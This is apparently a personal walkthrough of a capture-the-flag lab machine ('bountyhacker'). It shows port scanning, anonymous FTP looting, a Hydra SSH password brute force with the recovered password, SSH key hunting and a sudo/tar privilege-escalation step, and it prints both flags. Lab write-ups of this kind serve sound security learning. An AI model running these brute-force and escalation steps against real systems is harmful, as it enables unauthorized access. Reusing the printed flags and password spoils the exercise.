
Nmap
```
nmap -sS -T4 -p- 10.10.168.107
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-23 13:46 EDT
Nmap scan report for 10.10.168.107
Host is up (0.18s latency).
Not shown: 55529 filtered tcp ports (no-response), 10003 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 582.49 seconds
```

```
 nmap -T4 -p- -A 10.10.168.107
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-23 13:46 EDT
Nmap scan report for 10.10.168.107
Host is up (0.15s latency).
Not shown: 55529 filtered tcp ports (no-response), 10003 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.167.78
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
|_-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Aggressive OS guesses: HP P2000 G3 NAS device (89%), Linux 2.6.32 (88%), Linux 2.6.32 - 3.1 (88%), Linux 5.0 (88%), Linux 5.0 - 5.4 (88%), Linux 5.1 (88%), Ubiquiti AirOS 5.5.9 (88%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (88%), Linux 2.6.32 - 3.13 (88%), Linux 2.6.39 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 41742/tcp)
HOP RTT       ADDRESS
1   152.56 ms 10.8.0.1
2   153.07 ms 10.10.168.107

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 544.86 seconds
```

![[Pasted image 20231023231927.png]]

We have ftp which looks sus to me let's enumerate it
```
wget -m --no-passive ftp://anonymous:anonymous@10.10.168.107 #Download all
```
![[Pasted image 20231023233453.png]]
We got this data from ftp

```
gobuster dir -u 10.10.168.107 -w /usr/share/wordlists/dirb/common.txt
```
![[Pasted image 20231023233624.png]]

Will use Hydra as we got the password list
```
hydra -l lin -P locks.txt -f ssh://10.10.168.107 -V

[22][ssh] host: 10.10.168.107   login: lin   password: RedDr4gonSynd1cat3
```
https://haxez.org/wp-content/uploads/2022/06/HaXeZ_Hydra_Cheat_Sheet-1.pdf


```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-23 14:15:41
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.168.107:22/
[ATTEMPT] target 10.10.168.107 - login "lin" - pass "rEddrAGON" - 1 of 26 [child 0] (0/0)
(0/2)
[ATTEMPT] target 10.10.168.107 - login "lin" - pass "r3ddr@g0N" - 25 of 28 [child 5] (0/2)
[ATTEMPT] target 10.10.168.107 - login "lin" - pass "ReDSynd1ca7e" - 26 of 28 [child 7] (0/2)
[REDO-ATTEMPT] target 10.10.168.107 - login "lin" - pass "RedDr4gonSynd1cat3" - 27 of 28 [child 10] (1/2)
[REDO-ATTEMPT] target 10.10.168.107 - login "lin" - pass "dRa6oN5YNDiCATE" - 28 of 28 [child 12] (2/2)
[22][ssh] host: 10.10.168.107   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-23 14:15:47 
```

```
ssh lin@10.10.168.107
RedDr4gonSynd1cat3
```
![[Pasted image 20231023234930.png]]
```
THM{CR1M3_SyNd1C4T3}
```

```
lin@bountyhacker:/$ find / -name id_rsa 2> /dev/null
/home/lin/.ssh/id_rsa
lin@bountyhacker:/$ ls -la /home/lin/.ssh/id_rsa
-rw------- 1 lin lin 1766 Jun  7  2020 /home/lin/.ssh/id_rsa
lin@bountyhacker:/$ 

```

bountyhacker                                                                                                                                                 
127.0.0.1       localhost
127.0.1.1       bountyhacker

/home/lin/.ssh/id_rsa.pub

/home/lin/.ssh/id_rsa

sudo pkexec /bin/sh

etc/update-motd.d/00-header

I did manually testing and i think at night my mind was exhusted tomorrow and i was not able to see this thing yesterday
```
sudo -l
```
it was asking for lin password which i haven't seen yesterday
![[Pasted image 20231024140256.png]]

As you can see tar can run as root so will go to our best friend GTFPbins
So always prefer manual enumeration and than fire up automated tools
![[Pasted image 20231024140641.png]]
![[Pasted image 20231024140615.png]]
```
THM{80UN7Y_h4cK3r}
```

